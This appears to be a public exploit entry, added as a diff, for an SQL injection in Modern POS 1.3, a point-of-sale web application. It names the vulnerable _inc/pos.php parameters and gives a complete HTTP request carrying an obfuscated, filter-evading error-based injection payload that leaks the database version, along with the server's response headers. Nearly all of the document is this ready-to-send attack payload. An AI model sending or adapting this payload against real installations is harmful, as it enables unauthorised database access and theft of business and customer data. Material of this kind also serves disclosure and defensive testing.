@@ -1,0 +1,35 @@
+# Exploit Title: Modern POS 1.3 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://itsolution24.com/
+# Software Link: https://codecanyon.net/item/modern-pos-point-of-sale-with-stock-management-system/22702683
+# Version: 1.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/_inc/pos.php?query_string=[SQL]&category_id=&field=[SQL]&action_type=PRODUCTLIST
+# 
+
+GET /[PATH]/_inc/pos.php?query_string=Efe%27||(/*!11111SElecT*/+%27Efe%27+/*!11111FRom*/+/*!11111DuAl*/+/*!11111whERE*/+6=6+/*!11111anD*/+(/*!11111SEleCT*/+6+/*!11111FRoM*/(/*!11111SELECT*/+COuNT(*),/*!11111CONCAT*/(@@verSion,(/*!11111seleCT*/+(ELT(6=6,1))),/*!11111FLoOR*/(RAnD(0)*2))x+/*!11111FRoM*/+/*!12345InFOrMaTION_SchEmA.plUgINS*/+/*!11111grOUP*/+/*!11111by*/+x)a))||%27&action_type=PRODUCTLIST HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=074b581c124d1caf5df3477995946ea8; cpsession=%3aRoGDGcVEun7oqKs9%2c4760d80be71792470b1f6ebfd8f4c0a5; timezone=Asia/Baghdad
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 422 Unprocessable Entity
+Date: Sat, 12 Jan 2019 23:25:05 GMT
+Server: Apache
+X-Powered-By: PHP/7.2.13
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Transfer-Encoding: chunked
+Content-Type: application/json; charset=UTF-8
